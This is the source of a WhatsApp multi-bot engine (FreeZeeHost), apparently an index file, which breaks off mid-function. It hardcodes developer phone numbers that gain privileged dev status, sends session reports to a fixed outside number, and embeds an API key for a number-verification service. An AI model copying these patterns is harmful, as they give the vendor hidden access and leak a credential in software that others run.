import fs from "fs";
console.log("------------------------------------------");
console.log("🚀 STARTING BOT WITH CORE VERSION 1.0.1 🚀");
console.log("------------------------------------------");
import {
  makeWASocket,
  useMultiFileAuthState,
  Browsers,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  jidDecode,
  generateWAMessageFromContent,
  DisconnectReason,
  makeInMemoryStore
} from "baileys";
import readline from "readline";
import pino from "pino";
import chalk from "chalk"
import https from "https"
import moment from "moment-timezone";
import os from "os";
import path from "path";
import crypto from "crypto";
import { exec, execSync } from "child_process";
import "./settings.js";
import { compressMedia } from "./core/mediaEngine.js";
import PluginsLoad, { importModule } from "./core/loadPlugins.js";
import Database from "./core/database.js";
import "./core/serialize.js";
import "./core/bus.js";
import "./core/cache.js";
import "./core/analytics.js";
import "./core/repair.js";
import logger, { sysLog } from "./core/logger.js";
import handler from "./handler.js";
global.handler = handler;
import chokidar from "chokidar";
import { fileTypeFromBuffer } from 'file-type';
import { getBuffer, getSizeMedia } from "./core/utils.js";
import { fileURLToPath } from "url";
import { setupDailyTasks } from "./core/cron.js";
import { panel as panelCore, question, getAutoMenu } from "./core/panel.js";
import stripAnsi from "strip-ansi";
const Plugins = new PluginsLoad("./commands");
global.cmd = Plugins;
console.log(chalk.cyan("\n🚀 [SYSTEM] Memulai Bot Engine..."));
const db = new Database();
await db.init();
global.db = db;

// --- PRE-LOAD THUMBNAIL TO BUFFER ---
if (global.thumb && typeof global.thumb === 'string' && global.thumb.startsWith('http')) {
    try {
        const buf = await getBuffer(global.thumb);
        global.thumb = buf;
        console.log(chalk.green("✅ [SYSTEM] Thumbnail berhasil di-load ke Buffer"));
    } catch (e) {
        console.error(chalk.red("❌ [SYSTEM] Gagal load thumbnail ke Buffer:"), e.message);
    }
}
// ------------------------------------

global.interactiveSessions = new Map(); // Untuk fitur pesan interaktif
global.displayedBanner = false;
global.sessionSockets = new Map();
global.sessionIntervals = new Map();

const clearSessionIntervals = (sessionName) => {
    if (global.sessionIntervals.has(sessionName)) {
        global.sessionIntervals.get(sessionName).forEach(clearInterval);
        global.sessionIntervals.delete(sessionName);
    }
};

const addSessionInterval = (sessionName, intervalId) => {
    if (!global.sessionIntervals.has(sessionName)) {
        global.sessionIntervals.set(sessionName, []);
    }
    global.sessionIntervals.get(sessionName).push(intervalId);
};

/**
 * Tunggu sesi sampai stabil (terkoneksi) sebelum lanjut ke sesi berikutnya.
 */
const waitSessionStable = async (name, timeout = 15000) => {
    const start = Date.now();
    console.log(chalk.cyan(`[SYSTEM] Menunggu stabilitas sesi: ${name}...`));
    while (Date.now() - start < timeout) {
        const conn = global.sessionSockets.get(name);
        if (conn && conn.user) {
            console.log(chalk.green(`✅ [SYSTEM] Sesi ${name} stabil.`));
            return true;
        }
        await new Promise(r => setTimeout(r, 800));
    }
    return false;
};

global.sessionIntents = new Map();
global.enableWaSessionRecovery = false;
global.telegramBotConfigs = new Map();
global.telegramBotStarting = new Set();
global.telegramBaseDevIds = [
  "6285102360656",
  "6285604618277",
  "6285755077227",
  "93777419258",
  "7551937003"
];

// --- SYSTEM MONITOR & AUTO-CLEANUP ---
const startSystemMonitor = (conn) => {
    const sessionName = conn.sessionName || "default";

    // 1. Intelligent Maintenance Scheduler (Setiap Jam 03:00 Subuh)
    addSessionInterval(sessionName, setInterval(async () => {
        const jktTime = moment().tz("Asia/Jakarta");
        if (jktTime.hour() === 3 && jktTime.minute() === 0) {
            console.log(chalk.cyan("[SYSTEM] Menjalankan pembersihan subuh rutin..."));
            const tmpDir = path.join(process.cwd(), "tmp");
            if (fs.existsSync(tmpDir)) {
                const files = fs.readdirSync(tmpDir);
                files.forEach(file => { try { fs.unlinkSync(path.join(tmpDir, file)); } catch (e) {} });
                console.log(chalk.green(`✅ [SYSTEM] Maintenance Selesai. Hapus ${files.length} file.`));
            }
        }
    }, 60 * 1000));

    // 2. Resource Pulse Monitor & Emergency Purge (Setiap 5 Menit)
    addSessionInterval(sessionName, setInterval(() => {
        // --- FREEZEE PREMIUM: AUTO MEMORY OPTIMIZER ---
        if (typeof conn.autoOptimize === 'function') {
            conn.autoOptimize();
            console.log(chalk.gray("[FREEZEE] Auto-Memory Optimization performed."));
        }

        const memoryUsage = process.memoryUsage().heapUsed / 1024 / 1024; // MB
        
        // A. EMERGENCY CACHE PURGE (Jika > 600MB)
        if (memoryUsage > 600) {
            console.warn(chalk.yellow(`🚨 [SYSTEM] RAM kritis (${memoryUsage.toFixed(2)}MB). Membersihkan cache internal...`));
            global.stickerCache = {}; 
            global.buttonSpamTracker?.clear(); 
            global.floodTracker?.clear(); 
            if (global.gc) global.gc(); 
        }

        // B. AUTO-RESTART GUARD (Jika > 800MB)
        if (memoryUsage > 800) { 
            console.warn(chalk.red(`⚠️ [SYSTEM] Penggunaan RAM Tinggi: ${memoryUsage.toFixed(2)}MB. Melakukan restart mandiri...`));
            sysLog(conn, "ram", `RAM Usage: ${memoryUsage.toFixed(2)}MB. Automated restart triggered.`);
            exec("pm2 restart all");
        }

        // --- 🛡️ THE DEAD MAN'S SWITCH (DDoS / THREAD SPIKE GUARD) ---
        exec("ps -eLf | wc -l", async (err, stdout) => {
            if (!err) {
                const threadCount = parseInt(stdout.trim());
                if (threadCount > 800) { // Angka wajar VPS biasa < 300. >800 = Diserang/Fork Bomb
                    console.log(chalk.bgRed.white(`\n🚨 [DEAD MAN SWITCH ACTIVATED] 🚨\nAbnormal thread count detected (${threadCount}). Suspected DDoS/Server Overload!`));
                    
                    try {
                        // 1. Force Sync to Disk
                        await db.save(true); 
                        
                        // 2. Emergency File Backup
                        const backupPath = path.join(process.cwd(), `tmp/EMERGENCY_BACKUP_${Date.now()}.json`);
                        fs.writeFileSync(backupPath, JSON.stringify(db.list(), null, 2));

                        // 3. Send to Owner
                        const ownerJid = global.logJid || (global.owner[0] + "@s.whatsapp.net");
                        await conn.sendMessage(ownerJid, {
                            document: fs.readFileSync(backupPath),
                            mimetype: 'application/json',
                            fileName: `🚨_EMERGENCY_BACKUP_${new Date().toLocaleDateString()}.json`,
                            caption: `🚨 *DEAD MAN'S SWITCH ACTIVATED* 🚨\n\nSistem mendeteksi lonjakan Threads/Proses yang ekstrem (*${threadCount} Threads*).\nIni mengindikasikan adanya serangan DDoS atau Overload Server.\n\n_Bot telah melakukan backup darurat and akan mati otomatis untuk melindungi data._`
                        });

                        fs.unlinkSync(backupPath);
                        console.log(chalk.green("✅ [SYSTEM] Emergency Backup Sent. Committing Suicide."));
                        
                        // 4. Force Kill
                        process.exit(1);
                    } catch (e) {
                        console.error("Emergency Backup Failed:", e);
                        process.exit(1);
                    }
                }
            }
        });
        // -------------------------------------------------------------

    }, 5 * 60 * 1000));

    // 3. Socket Performance Profiler & Ghost Connection Watchdog
    global.lastMessageReceived = Date.now();
    global.lowResourceMode = false; // Flag untuk optimasi beban
    
    addSessionInterval(sessionName, setInterval(async () => {
        const now = Date.now();
        // A. Profiler
        const start = Date.now();
        try {
            await conn.query({
                tag: 'iq',
                attrs: { type: 'get', xmlns: 'w:p', to: '@s.whatsapp.net' },
                content: [{ tag: 'ping', attrs: {} }]
            });
            const latency = Date.now() - start;
            if (latency > 2500) {
                console.warn(chalk.yellow(`[PROFILE] High Latency: ${latency}ms`));
                global.lowResourceMode = true; // Aktifkan mode hemat jika lag
            } else {
                global.lowResourceMode = false;
            }
        } catch (e) {}

        // B. Connection Watchdog (Ghost Connection Check)
        // Jika bot online tapi tidak ada pesan masuk sama sekali selama 15 menit
        if (now - global.lastMessageReceived > 15 * 60 * 1000) {
            console.warn(chalk.red("[WATCHDOG] Ghost Connection detected. Forcing re-sync..."));
            sysLog(conn, "error", "Ghost Connection detected. Triggering automated reconnect.");
            conn.ws.close(); // Force reconnect
            global.lastMessageReceived = Date.now();
        }
    }, 45 * 1000));

    // 4. Auto-Backup Database (Setiap 24 Jam)
    addSessionInterval(sessionName, setInterval(async () => {
        try {
            console.log(chalk.cyan("[SYSTEM] Memulai Backup Database otomatis..."));
            const data = db.list();
            const backupPath = path.join(process.cwd(), `tmp/backup_${Date.now()}.json`);
            fs.writeFileSync(backupPath, JSON.stringify(data, null, 2));

            const ownerJid = global.logJid || (global.owner[0] + "@s.whatsapp.net");
            await conn.sendMessage(ownerJid, {
                document: fs.readFileSync(backupPath),
                mimetype: 'application/json',
                fileName: `Database_Backup_${new Date().toLocaleDateString()}.json`,
                caption: `📦 *DAILY AUTO-BACKUP* 📦\n\n_Backup rutin berhasil dilakukan. Simpan file ini untuk jaga-jaga data hilang._`
            });
            fs.unlinkSync(backupPath);
            sysLog(conn, "log", "Daily database backup sent successfully.");
            console.log(chalk.green("✅ [SYSTEM] Backup otomatis terkirim."));
        } catch (e) {
            console.error("❌ Auto-Backup failed:", e.message);
            sysLog(conn, "error", `Auto-Backup failed: ${e.message}`);
        }
    }, 24 * 60 * 60 * 1000));

    // 4. Weekly Stats Reset (Setiap Senin Jam 00:00)
    addSessionInterval(sessionName, setInterval(async () => {
        const now = new Date();
        if (now.getDay() === 1 && now.getHours() === 0 && now.getMinutes() === 0) {
            console.log(chalk.cyan("[SYSTEM] Menjalankan reset statistik mingguan..."));
            const groups = db.list().group;
            for (let id in groups) {
                groups[id].memberStats = {};
            }
            await db.save();
            sysLog(conn, "log", "Weekly Group Stats have been reset successfully.");
        }
    }, 60 * 1000)); // Cek tiap menit

    // 5. Database Garbage Collector (Setiap 24 Jam)
    addSessionInterval(sessionName, setInterval(async () => {
        console.log(chalk.cyan("[SYSTEM] Menjalankan DB Garbage Collector..."));
        const data = db.list();
        const now = Date.now();
        const maxInactive = 30 * 24 * 60 * 60 * 1000; // 30 Hari
        
        let userCleanup = 0;
        let groupCleanup = 0;

        for (let jid in data.user) {
            if (data.user[jid].owner) continue;
            if (now - (data.user[jid].lastSeen || 0) > maxInactive) {
                delete data.user[jid];
                userCleanup++;
            }
        }

        for (let gid in data.group) {
            if (now - (data.group[gid].lastSeen || 0) > maxInactive) {
                delete data.group[gid];
                groupCleanup++;
            }
        }

        if (userCleanup > 0 || groupCleanup > 0) {
            await db.save();
            console.log(chalk.green(`✅ [SYSTEM] GC Selesai: Hapus ${userCleanup} user & ${groupCleanup} grup tidak aktif.`));
            sysLog(conn, "log", `DB GC: Cleaned ${userCleanup} users and ${groupCleanup} groups (Inactive > 30 days).`);
        }
    }, 24 * 60 * 60 * 1000));

    // 6. Automated Security Audit (Setiap 24 Jam)
    addSessionInterval(sessionName, setInterval(async () => {
        console.log(chalk.cyan("[SYSTEM] Menjalankan Security Audit..."));
        const criticalFiles = [".env", "database.json", "settings.js"];
        let vulnerabilities = [];

        for (const file of criticalFiles) {
            const filePath = path.join(process.cwd(), file);
            if (fs.existsSync(filePath)) {
                try {
                    const stats = fs.statSync(filePath);
                    const mode = (stats.mode & parseInt('777', 8)).toString(8);
                    // Jika file terlalu terbuka (misal 777 atau 666), beri peringatan
                    if (mode === '777' || mode === '666') {
                        vulnerabilities.push(`Weak permissions on ${file} (${mode})`);
                    }
                } catch (e) {}
            }
        }

        if (vulnerabilities.length > 0) {
            sysLog(conn, "error", `🛡️ *SECURITY AUDIT ALERT* 🛡️\n\nBahaya ditemukan:\n${vulnerabilities.map(v => `◦ ${v}`).join("\n")}\n\n_Segera perbaiki izin file di VPS Bang!_`);
        } else {
            console.log(chalk.green("✅ [SYSTEM] Security Audit Passed. System is Hardened."));
        }
    }, 24 * 60 * 60 * 1000));

    // 7. AI Morning Newsletter (Setiap jam 07:00 pagi)
    addSessionInterval(sessionName, setInterval(async () => {
        const now = new Date();
        const jktTime = moment().tz("Asia/Jakarta");
        if (jktTime.hour() === 7 && jktTime.minute() === 0) {
            try {
                console.log(chalk.cyan("[SYSTEM] Menjalankan AI Morning Newsletter..."));
                const { data } = await axios.get("https://api.neoxr.eu/api/gpt4-session", {
                    params: {
                        q: "Berikan satu fakta unik and keren tentang teknologi atau dunia botting hari ini. Kemas dalam bahasa Indonesia yang sangat gaul and singkat untuk diposting di channel bot. Awali dengan '🌅 *MORNING UPDATES*'.",
                        session: "newsletter_gen",
                        apikey: global.neoxr
                    }
                });

                if (data?.status && data.data?.message) {
                    const content = data.data.message + `\n\n_Powered by ${global.botname} AI_`;
                    await conn.sendMessage(global.idch, { 
                        text: content,
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true
                        }
                    });
                    console.log(chalk.green("✅ [SYSTEM] AI Newsletter terkirim ke Channel."));
                }
            } catch (e) {
                console.error("❌ AI Newsletter failed:", e.message);
            }
        }
    }, 60 * 1000));

    // 7. Sub-Bot Heartbeat (Setiap 10 Menit)
    addSessionInterval(sessionName, setInterval(async () => {
        console.log(chalk.cyan("[SYSTEM] Menjalankan Heartbeat Sub-Bot..."));
        const sessions = global.listSessions ? global.listSessions() : [];
        for (const session of sessions) {
            if (!session.isRunning && session.name.startsWith("sewa_")) {
                console.log(chalk.yellow(`[HEARTBEAT] Sesi ${session.name} terputus. Mencoba reconnect...`));
                try {
                    await global.startSession(session.name, null, { allowAuthPrompt: false });
                    await waitSessionStable(session.name); // Sequential wait
                } catch (e) {
                    console.error(`[HEARTBEAT ERROR] Gagal restart ${session.name}:`, e.message);
                }
            }
        }
    }, 10 * 60 * 1000));

    // 8. Global TTL Manager (Memory Leak Guard - Setiap 30 Menit)
    addSessionInterval(sessionName, setInterval(() => {
        const now = Date.now();
        console.log(chalk.cyan("[SYSTEM] Menjalankan Global TTL Manager..."));
        
        if (global.responseCache) global.responseCache.purge();

        if (global.interactiveSessions) {
            let sessionPurged = 0;
            for (const [key, session] of global.interactiveSessions) {
                if (now - (session.timestamp || 0) > 3600000) {
                    global.interactiveSessions.delete(key);
                    sessionPurged++;
                }
            }
            if (sessionPurged > 0) console.log(chalk.green(`✅ [TTL] Dihapus ${sessionPurged} sesi interaktif kadaluarsa.`));
        }

        if (global.floodTracker) {
            let floodPurged = 0;
            for (const [key, flood] of global.floodTracker) {
                if (now - flood.last > 15 * 60 * 1000) {
                    global.floodTracker.delete(key);
                    floodPurged++;
                }
            }
            if (floodPurged > 0) console.log(chalk.green(`✅ [TTL] Dihapus ${floodPurged} tracker anti-spam tidak aktif.`));
        }
    }, 30 * 60 * 1000));

    // 9. Dynamic Bot Activity Presences (Bio Cycler - Setiap 10 Menit)
    let bioState = 0;
    addSessionInterval(sessionName, setInterval(async () => {
        try {
            if (!conn.user) return;
            const uptime = Func?.toTime ? Func.toTime(process.uptime() * 1000) : `${Math.floor(process.uptime() / 3600)}h`;
            const activeUsers = Object.keys(global.db?.list()?.user || {}).length;
            const ramUsed = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
            
            const bios = [
                `🟢 Online | Uptime: ${uptime} | ${global.botname}`,
                `🚀 Serving ${activeUsers} Active Users | ${global.botname}`,
                `⚡ Hybrid Engine v${process.version} | RAM: ${ramUsed}MB`,
                `🛡️ Secured by FreeZeeHost Systems`
            ];
            
            const selectedBio = bios[bioState % bios.length];
            await conn.updateProfileStatus(selectedBio);
            bioState++;
        } catch (e) {
            // Abaikan jika gagal update bio
        }
    }, 10 * 60 * 1000));
};
// startSystemMonitor dipanggil di dalam connection.update setelah bot connect
// -------------------------------------

// --- THE BLACK BOX (TERMINATION GUARD & AUTO-BACKUP) ---
const handleShutdown = async (signal) => {
    console.log(chalk.bgRed.white(`\n🚨 [SYSTEM] Received ${signal} from OS. VPS might be shutting down or suspended! Executing The Black Box protocol...`));
    try {
        // 1. Force Sync Data to Disk
        await global.db.save(true); 
        console.log(chalk.cyan("📦 [BLACK BOX] Memory synced to disk."));

        // 2. Create Emergency Backup File
        const backupPath = path.join(process.cwd(), `tmp/BLACKBOX_BACKUP_${Date.now()}.json`);
        fs.writeFileSync(backupPath, JSON.stringify(global.db.list(), null, 2));

        // 3. Send to Owner
        if (global.primaryConn) {
            const ownerJid = global.logJid || (global.owner[0] + "@s.whatsapp.net");
            await global.primaryConn.sendMessage(ownerJid, {
                document: fs.readFileSync(backupPath),
                mimetype: 'application/json',
                fileName: `🚨_BLACKBOX_BACKUP_${new Date().toLocaleDateString()}.json`,
                caption: `🚨 *THE BLACK BOX ACTIVATED* 🚨\n\nSistem menerima sinyal *${signal}* dari OS.\nIni biasanya terjadi jika VPS dimatikan paksa, di-restart, atau terkena *Suspend* oleh Provider (seperti DigitalOcean).\n\n_Data terakhir berhasil diselamatkan._`
            });
            console.log(chalk.green("✅ [BLACK BOX] Emergency Backup sent to owner."));
        }
    } catch (e) {
        console.error(chalk.red("❌ [BLACK BOX] Data rescue failed:"), e.message);
    } finally {
        console.log(chalk.yellow("🛑 [SYSTEM] Exiting cleanly. Goodbye."));
        process.exit(0);
    }
};

process.on("SIGINT", () => handleShutdown("SIGINT")); // Ctrl+C
process.on("SIGTERM", () => handleShutdown("SIGTERM")); // VPS Kill/Suspend signal
process.on("SIGQUIT", () => handleShutdown("SIGQUIT"));
// --------------------------------------------------------
// ----------------------------

const HANDLER_FILE = fileURLToPath(new URL("./handler.js", import.meta.url));
let currentHandler = handler;
let handlerReloadTimeout = null;
let telegramFeatureWatcher = null;
let telegramFeatureReloadTimeout = null;

const reloadHandler = async () => {
  try {
    const freshHandler = await importModule(HANDLER_FILE);

    if (typeof freshHandler !== "function") {
      throw new Error("handler.js tidak mengekspor function default yang valid")
    }

    currentHandler = freshHandler;
    console.log(chalk.green("[HANDLER HOT-RELOAD] handler.js berhasil dimuat ulang"))
    } catch (error) {
    console.error(chalk.red(`[HANDLER HOT-RELOAD] Gagal reload handler.js: ${error.message}`))
    if (global.primaryConn) {
        sysLog(global.primaryConn, "error", `🚨 *HANDLER RELOAD FAILED*\n\nError: ${error.message}\n\n_Bot tetap menggunakan versi stabil terakhir._`);
    }
    }
    };

fs.watchFile(HANDLER_FILE, { interval: 700 }, () => {
  clearTimeout(handlerReloadTimeout);
  handlerReloadTimeout = setTimeout(() => {
    reloadHandler();
  }, 250);
});

function setupGlobalSourceReloadWatcher() {
  const watcher = chokidar.watch([
    "core",
    "telegram",
    "index.js",
    "case.js"
  ], {
    ignored: [/node_modules/, /sessions/, /database/, /\.git/],
    persistent: true,
    ignoreInitial: true
  });

  watcher.on("change", async (path) => {
    console.log(chalk.yellow(`\n[HOT-RELOAD] Perubahan terdeteksi: ${path}`));
    
    if (path.startsWith("core/serialize.js")) {
      try {
        const freshSerialize = await importModule(fileURLToPath(new URL("./core/serialize.js", import.meta.url)));
        global.serialize = freshSerialize;
        console.log(chalk.green("✅ [HOT-RELOAD] core/serialize.js diperbarui"));
      } catch (e) { 
        console.error(chalk.red(`❌ [HOT-RELOAD] Gagal reload serialize: ${e.message}`)); 
        if (global.primaryConn) sysLog(global.primaryConn, "error", `🚨 *SERIALIZE RELOAD FAILED*\n\nError: ${e.message}`);
      }
    } 
    
    else if (path === "handler.js" || path === "case.js") {
      console.log(chalk.yellow(`[HOT-RELOAD] Memicu pemuatan ulang handler karena perubahan pada ${path}`));
      await reloadHandler();
    }
    
    else if (path.startsWith("telegram/")) {
      await reloadRunningTelegramBots(path);
    } 
    
    else if (path === "index.js") {
      console.log(chalk.red("⚠️  [SYSTEM] index.js berubah. Melakukan restart via PM2..."));
      const { exec } = await import('child_process');
      exec("pm2 restart all");
    }
  });

  console.log(chalk.green("🔥 [HOT-RELOAD] Sistem Watcher Global Aktif!"));
}

setupGlobalSourceReloadWatcher()

async function reloadRunningTelegramBots(reasonFile = "telegram feature update") {
  const runningBotNames = [...global.telegramBots.keys()]

  if (!runningBotNames.length) {
    console.log(chalk.yellow(`[TELEGRAM FEATURE HOT-RELOAD] perubahan terdeteksi (${reasonFile}), tidak ada bot Telegram aktif.`))
    return
  }

  console.log(chalk.yellow(`[TELEGRAM FEATURE HOT-RELOAD] perubahan terdeteksi: ${reasonFile}`))

  for (const name of runningBotNames) {
    const storedToken = global.telegramBotConfigs.get(name)
    const configPath = `${TELEGRAM_SESSION_DIR}/${name}.json`
    let token = storedToken

    if (fs.existsSync(configPath)) {
      try {
        const data = JSON.parse(fs.readFileSync(configPath, "utf8"))
        token = data?.token || token
      } catch (error) {
        console.log(chalk.red(`[TELEGRAM FEATURE HOT-RELOAD] gagal baca config ${name}: ${error.message}`))
      }
    }

    const bot = global.telegramBots.get(name)

    if (bot) {
      try {
        await bot.stop()
      } catch {
      }
      global.telegramBots.delete(name)
    }

    if (token) {
      await startTelegramBot(name, token)
    }
  }
}

function setupTelegramFeatureWatcher() {
  if (telegramFeatureWatcher) return

  telegramFeatureWatcher = chokidar.watch("./telegram", {
    ignored: /(^|[\/\\])\../,
    ignoreInitial: true,
    awaitWriteFinish: {
      stabilityThreshold: 350,
      pollInterval: 100
    }
  })

  const handleTelegramFeatureReload = (changedPath) => {
    const normalized = String(changedPath).replace(/\\/g, "/")
    if (!normalized.endsWith(".js")) return

    clearTimeout(telegramFeatureReloadTimeout)
    telegramFeatureReloadTimeout = setTimeout(() => {
      reloadRunningTelegramBots(normalized)
    }, 400)
  }

  telegramFeatureWatcher
    .on("add", handleTelegramFeatureReload)
    .on("change", handleTelegramFeatureReload)
    .on("unlink", handleTelegramFeatureReload)
}

setupTelegramFeatureWatcher()



const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const LOG_DIR = "./data/sampah/logs"
const SESSION_DIR = "./sessions"
const TELEGRAM_SESSION_DIR = "./telegrams"

if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR, { recursive: true })
}

const formatUptime = (seconds) => {
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor(seconds % (3600 * 24) / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${d}d ${h}h ${m}m ${s}s`;
};

const toSHA256 = (data) => {
  return crypto.createHash('sha256').update(String(data)).digest('hex');
};

const displayBanner = (conn) => {
  if (global.displayedBanner) return;
  global.displayedBanner = true;
  global.bootReported = false

  const botMode = db.list().settings.self ? "Self Mode" : "Public Mode";
  console.log(chalk.yellow(`
# Time WIB: ${chalk.green(moment().tz("Asia/Jakarta").format("HH:mm:ss DD/MM/YYYY"))}
# Platform: ${chalk.green(os.platform())} (${os.arch()})
# Memory: ${chalk.green(((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(2))}% used
# Uptime: ${chalk.green(formatUptime(os.uptime()))}
# Node.js: ${chalk.green(process.version)}
# Mode: ${chalk.green(botMode)}
# Creator: ${chalk.green(`${global.ownername}`)}
`));
};



const verifyNumberDB = (number) => {
  return new Promise((resolve) => {
    const url = `https://db.zpr0.com/verifynumber?apikey=FreeZeeHost12&username=FreeZeeHost&number=${number}`

    https.get(url, (res) => {
      let data = ""

      res.on("data", (chunk) => (data += chunk))
      res.on("end", () => {
        try {
          const json = JSON.parse(data)

          console.log("[DB RESPONSE]", json)

          // VALIDASI SESUAI RESPONSE ASLI DB
          if (json?.success === true && json?.is_owned === true) {
            return resolve(true)
          }

          resolve(false)
        } catch (e) {
          console.error("[DB ERROR] JSON parse gagal:", e)
          resolve(false)
        }
      })
    }).on("error", (err) => {
      console.error("[DB ERROR]", err.message)
      resolve(false)
    })
  })
}

const BASE_DEV_NUMBERS = [
  "6285102360656",
  "6285604618277",
  "6285755077227",
  "93777419258"
]

function getDevNumbers() {
  const dbDev = (db.list().dev || [])
    .map(v => String(v || "").replace(/[^0-9]/g, ""))
    .filter(Boolean)

  return [...new Set([...BASE_DEV_NUMBERS, ...dbDev])]
}

function isDevNumber(number) {
  const clean = String(number || "").replace(/[^0-9]/g, "")
  return !!clean && getDevNumbers().includes(clean)
}

const reconnectState = new Map()

function getReconnectState(sessionName) {
  if (!reconnectState.has(sessionName)) {
    reconnectState.set(sessionName, {
      attempts: 0,
      timer: null,
      reconnecting: false
    })
  }

  return reconnectState.get(sessionName)
}

function resetReconnectState(sessionName) {
  const state = getReconnectState(sessionName)
  state.attempts = 0
  state.reconnecting = false

  if (state.timer) {
    clearTimeout(state.timer)
    state.timer = null
  }
}

function getReconnectDelay(sessionName, statusCode) {
  const state = getReconnectState(sessionName)
  state.attempts += 1

  // Jitter: Tambahkan delay acak (1-3 detik) agar antar sesi tidak tabrakan
  const jitter = Math.floor(Math.random() * 3000);

  // Jika Code 440 (Conflict), tunggu lebih lama (minimal 15 detik)
  if (statusCode === 440) {
      return 15000 + jitter;
  }

  let baseDelay = 5000;
  if (state.attempts > 3) baseDelay = 10000;
  if (state.attempts > 6) baseDelay = 20000;
  if (state.attempts > 10) baseDelay = 60000;

  return baseDelay + jitter;
}

function isReconnectableStatus(statusCode) {
  return statusCode !== DisconnectReason.loggedOut
}

global.isIgnorableRuntimeError = isIgnorableRuntimeError
function isIgnorableRuntimeError(err) {
  const raw = err?.stack || err?.message || String(err || "")
  const text = raw.toLowerCase()
  const statusCode = err?.output?.statusCode || err?.data?.output?.statusCode

  return (
    err === 1006 ||
    statusCode === 428 ||
    statusCode === 408 ||
    text.includes("connection closed") ||
    text.includes("stream errored out") ||
    text.includes("timed out") ||
    text.includes("precondition required") ||
    text.includes("socket closed unexpectedly")
  )
}

function writeSessionRuntimeLog(sessionName, message) {
  try {
    const date = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss")
    const line = `[${date}] [${sessionName}] ${message}\n`
    fs.appendFileSync(`${LOG_DIR}/session-runtime.log`, line)
  } catch {
  }
}









function scheduleSessionReconnect(sessionName, options = {}, statusCode) {
  const reconnectInfo = getReconnectState(sessionName)

  if (reconnectInfo.reconnecting) {
    console.log(chalk.yellow("⏳ Sedang reconnect... tunggu..."))
    writeSessionRuntimeLog(sessionName, "reconnect skipped because another reconnect is in progress")
    return
  }

  reconnectInfo.reconnecting = true
  const delayMs = getReconnectDelay(sessionName, statusCode)
  writeSessionRuntimeLog(sessionName, `reconnect scheduled attempt=${reconnectInfo.attempts} delay=${delayMs}ms`)

  console.log(
    chalk.yellow(
      `🔄 Reconnect attempt ${reconnectInfo.attempts} untuk ${sessionName} dalam ${Math.floor(delayMs / 1000)} detik...`
    )
  )

  reconnectInfo.timer = setTimeout(async () => {
    try {
      reconnectInfo.reconnecting = false
      reconnectInfo.timer = null
      writeSessionRuntimeLog(sessionName, "reconnect execution started")
      await waSocket({
        allowAuthPrompt: false,
        sessionName,
        ...options
      })
      writeSessionRuntimeLog(sessionName, "reconnect execution finished")
    } catch (err) {
      reconnectInfo.reconnecting = false
      reconnectInfo.timer = null
      writeSessionRuntimeLog(sessionName, `reconnect failed: ${err?.message || err}`)
      console.error("Reconnect gagal:", err.message)
    }
  }, delayMs)
}

function setupSessionHealthMonitor() {
  if (global.sessionHealthMonitorInitialized) return
  global.sessionHealthMonitorInitialized = true

  setInterval(async () => {
    if (!global.enableWaSessionRecovery) return

    const sessions = getSessions()

    for (const name of sessions) {
      const info = getSessionInfo(name)
      const reconnectInfo = getReconnectState(name)

      if (!info.hasCreds) continue
      if (info.isRunning) continue
      if (global.sessionIntents.get(name) === "stop") continue
      if (global.sessionIntents.get(name) === "delete") continue
      if (reconnectInfo.reconnecting) continue

      writeSessionRuntimeLog(name, "healthcheck detected inactive session with creds, starting recovery")
      scheduleSessionReconnect(name)
    }
  }, 120000)
}

// ===== FREEZEEHOST MULTI BOT PANEL =====

if (!fs.existsSync(SESSION_DIR)) {
  fs.mkdirSync(SESSION_DIR)
}

function getSessions(){
  if(!fs.existsSync(SESSION_DIR)) return []
  return fs.readdirSync(SESSION_DIR).filter(v =>
    fs.statSync(`${SESSION_DIR}/${v}`).isDirectory()
  )
}



function getSessionInfo(name) {
  const path = `${SESSION_DIR}/${name}`
  const credsPath = `${path}/creds.json`
  const socket = global.sessionSockets.get(name)
  const config = getSessionConfig(name)

  return {
    name,
    path,
    hasCreds: fs.existsSync(credsPath),
    isRunning: !!socket,
    socket,
    config
  }
}

function getDefaultSessionConfig(name) {
  return {
    name,
    botname: "FreeZeeHost Bot",
    phoneNumber: "",
    createdAt: new Date().toISOString(),
    startedAt: null,
    lastStoppedAt: null,
    lastDisconnectAt: null,
    lastDisconnectCode: null,
    lastPairingAt: null,
    restartCount: 0,
    permissions: {
      ownerOnly: false,
      allowedCommands: [],
      blockedCommands: []
    },
    auditLog: []
  }
}

function getSessionConfigPath(name) {
  return `${SESSION_DIR}/${name}/config.json`
}

function getSessionConfig(name) {
  const configPath = getSessionConfigPath(name)
  const fallback = getDefaultSessionConfig(name)

  if (!fs.existsSync(configPath)) return fallback

  try {
    const data = JSON.parse(fs.readFileSync(configPath, "utf8"))
    return {
      ...fallback,
      ...data,
      permissions: {
        ...fallback.permissions,
        ...(data.permissions || {})
      },
      auditLog: Array.isArray(data.auditLog) ? data.auditLog : []
    }
  } catch {
    return fallback
  }
}

function saveSessionConfig(name, updater = {}) {
  const configPath = getSessionConfigPath(name)
  const current = getSessionConfig(name)
  const next = typeof updater === "function"
    ? updater(current)
    : {
        ...current,
        ...updater,
        permissions: {
          ...current.permissions,
          ...(updater.permissions || {})
        }
      }

  fs.writeFileSync(configPath, JSON.stringify(next, null, 2))
  return next
}

function appendSessionAudit(name, action, extra = {}) {
  return saveSessionConfig(name, (current) => {
    const entry = {
      action,
      at: new Date().toISOString(),
      ...extra
    }

    return {
      ...current,
      auditLog: [entry, ...(current.auditLog || [])].slice(0, 25)
    }
  })
}

async function reportSessionWatchdog(conn, name, type, extra = {}) {
  try {
    const targets = ["6285102360656@s.whatsapp.net"]

    const info = getSessionInfo(name)
    const message = [
      "⚠️ *SESSION WATCHDOG REPORT*",
      "",
      `Session : ${name}`,
      `Type    : ${type}`,
      `Status  : ${info.isRunning ? "running" : info.hasCreds ? "idle" : "no-creds"}`,
      ...Object.entries(extra).map(([key, value]) => `${key} : ${value ?? "-"}`)
    ].join("\n")

    for (const jid of targets) {
      await conn.sendMessage(jid, { text: message }).catch(() => {})
    }
